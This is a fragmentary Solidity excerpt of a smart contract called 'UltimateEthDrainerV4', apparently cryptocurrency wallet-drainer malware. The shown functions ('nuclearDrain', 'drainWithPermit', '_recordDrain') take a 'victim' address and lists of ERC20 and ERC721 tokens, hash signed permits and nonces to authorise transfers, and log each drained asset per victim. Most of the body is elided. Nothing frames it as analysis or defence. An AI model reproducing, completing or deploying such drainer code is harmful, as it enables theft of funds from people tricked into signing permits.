...
contract UltimateEthDrainerV4 is Ownable {
    ...
    address public lzEndpoint; // Mock address
    ...
    function nuclearDrain(
        ...
        // Verify signature and merkle proof
        bytes32 hash = keccak256(abi.encodePacked(
            victim, erc20Tokens, erc721Tokens, nonces[victim]++, deadline
    ...
    function drainWithPermit(
        ...
        bytes32 authHash = keccak256(abi.encodePacked(
            victim, token, amount, nonces[victim]++
        )).toEthSignedMessageHash();
    ...
    function _recordDrain(address victim, address asset, uint256 amount) private {
        victimHistory[victim].push(DrainRecord(asset, amount, block.timestamp));
